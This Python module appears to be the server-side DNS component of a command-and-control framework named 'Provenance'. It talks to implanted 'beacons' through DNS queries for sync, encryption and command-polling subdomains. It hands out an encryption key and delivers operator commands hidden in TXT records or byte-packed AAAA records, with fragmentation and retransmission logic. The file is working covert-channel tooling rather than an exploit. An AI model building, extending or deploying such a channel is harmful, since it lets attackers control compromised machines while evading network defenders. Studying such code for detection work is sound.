from dnslib import DNSRecord, QTYPE, TXT, AAAA, DNSError, RR, CLASS
from backend.handlers.protocolhandler import ProtocolHandler
from util.structs import CommandType, Command
from enum import Enum
from collections import deque
import logging

retransmit = {
    "a": 1, "b": 2, "c": 3, "d": 4,
    "e": 5, "f": 6, "g": 7, "h": 8,
    "i": 9, "j": 10, "k": 11, "l": 12,
    "m": 13, "n": 14, "o": 15, "p": 16,
    "q": 17, "r": 18, "s": 19, "t": 20,
    "u": 21, "v": 22, "w": 23, "x": 24,
    "y": 25, "z": 26
}

class Records(Enum):
    """ The types of records the DNSHandler can currently encode """
    TXT = (QTYPE.TXT, TXT, 252)
    AAAA = (QTYPE.AAAA, AAAA, 13)

class Domains(Enum):
    """ The valid subdomains used as function indicators by Resolution """
    SYNC = "sync"    
    ENCRYPT = "encrypt"
    QUERY = "query"
    RETRANSMIT = "rquery"
    CONFIRM = "confirm"

class Opcodes(Enum):
    NOP = 0
    ACK = 1
    KEY = 2
    DATA = 3
    EDATA = 4
    END = 5
    SYNCREQ = 6


class DNSHandler(ProtocolHandler):
    """ This is the Provenance Handler implementation for DNS beacons"""

    def __init__(self, ip, socket):
        super().__init__(ip, socket)
        self.logger = logging.getLogger("Provenance")
        self.latest_request_id = None
        self.edns = False
        self.fragments = deque()
        self.prev_cmd = []
        self.test = 1

    def __repr__(self):
        return "DNS"

    def synchronize(self, raw_request, port):
        """
        See protocolhandler.py
        """
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            # reverse the fqdn and split on "." for easier command fetching
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.SYNC.value:
                platform, hostname = query[5], query[4]
                self._send_data(request, port, Opcodes.ACK.value, None)
                self.fragments.clear()
                return (platform, hostname)
            else:
                # Issue a SYNC-REQUEST if server went down and needs to resync
                self._send_data(request, port, Opcodes.SYNCREQ.value, None)
        except DNSError:
            self.logger.debug(f"[{self.ip}] synchronize: Packet Malformed")
        return ""

    def encrypt(self, raw_request, port, key):
        """
        See protocolhandler.py
        """
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            q = request.questions[0]
            query = str(q.get_qname()).split(".")[::-1]
            if query[3] == Domains.ENCRYPT.value:
                self._send_data(request, port, Opcodes.KEY.value, key)
                self.fragments.clear()
                return 1
            elif query[3] == Domains.CONFIRM.value:
                if query[4] == Domains.ENCRYPT.value:
                    self._send_data(request, port, Opcodes.ACK.value, None)
                    self.fragments.clear()
                    return 2
            else:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Client not in ENCRYPT. Falling back to SYNC")
                return 0

        except DNSError:
            self.logger.debug(f"[{self.ip}] encrypt: DNS Query Malformed")
            return 1

    def respond(self, raw_request, port, cmd):
        """
        See protocolhandler.py
        """
        data = raw_request[0].strip()
        try:
            request = DNSRecord.parse(data)
            question = request.questions[0]
            query = str(question.get_qname()).split(".")[::-1]

            # If the client has request a new command or a retrasmission
            # of missing fragmented pieces we continue
            if query[3] == Domains.QUERY.value:
                pass
            elif query[3] == Domains.RETRANSMIT.value:
                # Get the missing chunk from the translated mapping from alphabet
                # to integers
                fragment = self.prev_cmd[retransmit[query[4]] - 1]
                self._send_fragment(request, fragment, port)
            else:
                # Return back to SYNC state, will perform SYNC-REQUEST
                self.logger.debug(f"{self.ip}: Client not in QUERY. Falling back to SYNC")
                return 0
            
            # If opcode is a normal QUERY then procede
            opcode = request.header.get_opcode() 
            if opcode == 0: # STANDARD QUERY
                # If there are fragments to send, the beacon is waiting to
                # assemble a command from multiple packets
                if self.fragments:
                    frag = self.fragments.popleft()
                    self.logger.debug("Sending Fragment")
                    self._send_fragment(request, frag, port)
                    if not self.fragments:
                        self.logger.debug("Returning To Ready State")
                        return 2
                    return 3
                # Otherwise we just send the next command
                self.latest_request_id = request.header.id
                cmd_opcode = 0 if cmd.type == CommandType.NOP else 3
                self._send_data(request, port, cmd_opcode, cmd.command)
                return 2
            else:
                pass

        except DNSError as e:
            self.logger.debug(f"[{self.ip}] respond: DNS Packet Malformed: {str(e)}")
        
        if self.fragments:
            return 3
        return 2
    

    def _send_fragment(self, query: DNSRecord, fragment: RR, port: int):
        # TODO: DISALLOW RECORD SWITCHING BETWEEN FRAGMENTS
        response = query.reply()
        response.add_answer(fragment)
        self.socket.sendto(response.pack(), (self.ip, port))
        

    def _send_data(self, query: DNSRecord, port: int, opcode: int, data: str):
        """
        Send control packets to the client
        """

        rr_type = query.questions[0].qtype
        response = query.reply()
        
        if rr_type == 16:
            response = self._packetize_txt(query, response, opcode, data)
        elif rr_type == 28:
            response, rest = self._packetize_aaaa(query, response, opcode, data)
            self.fragments = rest
        else:
            self.logger.debug("send_data: invalid record")
            pass

        self.socket.sendto(response.pack(), (self.ip, port))

    def _packetize_txt(self, query, response, opcode, data=None):
        _, constructor, msg_size = Records.TXT.value
        rr_type = query.questions[0].qtype
        chunks = [f"{data[i:i+msg_size]}" for i in range(0, len(data), msg_size)] 
        if opcode == 0:
            response.add_answer(
                    RR(rname=query.get_q().get_qname(),
                    rtype=rr_type,
                    rclass=CLASS.IN,
                    rdata=constructor("010vsp1=This is a DNS TXT Record"),
                    ttl=1337)
            )
        else:
            for i, chunk in enumerate(chunks):
                answer = RR(
                        rname=query.get_q().get_qname(),
                        rtype=rr_type,
                        rclass=CLASS.IN,
                        rdata=constructor(f"{opcode}{len(chunks)}{i}" + chunk),
                        ttl=1337)
                response.add_answer(answer)
        return response


    def _packetize_aaaa(self, query, response, opcode, data=None):
        self.prev_cmd = []
        if not data:
            data = "test"

        _, constructor, msg_size = Records.AAAA.value
        rr_type = query.questions[0].qtype
        chunks = [data[i:i+msg_size] for i in range(0, len(data), msg_size)]
        rest = deque()
        if opcode == 0 or not data:
            response.add_answer(
                RR(
                    rname=query.get_q().get_qname(),
                    rtype=rr_type,
                    rclass=CLASS.IN,
                    # Send a nop packet of seq num 0, and expected length 1
                    rdata=constructor([0, 1, 0] + [0 for _ in range(13)]),
                    ttl=1337))
        else:
            for i, chunk in enumerate(chunks):
                #data = [opcode, i, len(chunks)] + [ord(c) for c in chunk]
                data = [opcode, len(chunks) - 1, i] + [ord(c) for c in chunk] #currently doing edns
                # Pad the data to 16 bytes
                data += [0 for _ in range(16 - len(data))]
                answer = RR(
                        rname=query.get_q().get_qname(),
                        rtype=rr_type,
                        rclass=CLASS.IN,
                        # 1st byte indicates data, second byte is seq number, 3rd is num transmission packets
                        rdata=constructor(data),
                        ttl=1337)
                self.prev_cmd.append(answer)
                
            
                # Add at least one response to the query
                if i == 0:
                    response.add_answer(answer)
                    continue

                # If Extended DNS is enabled, we can have up to 2048 bytes.
                # Otherwise we're going to send command over multiple queries
                if self.edns and i > 0:
                    response.add_answer(answer)
                else:
                    rest.append(answer)
        return response, rest
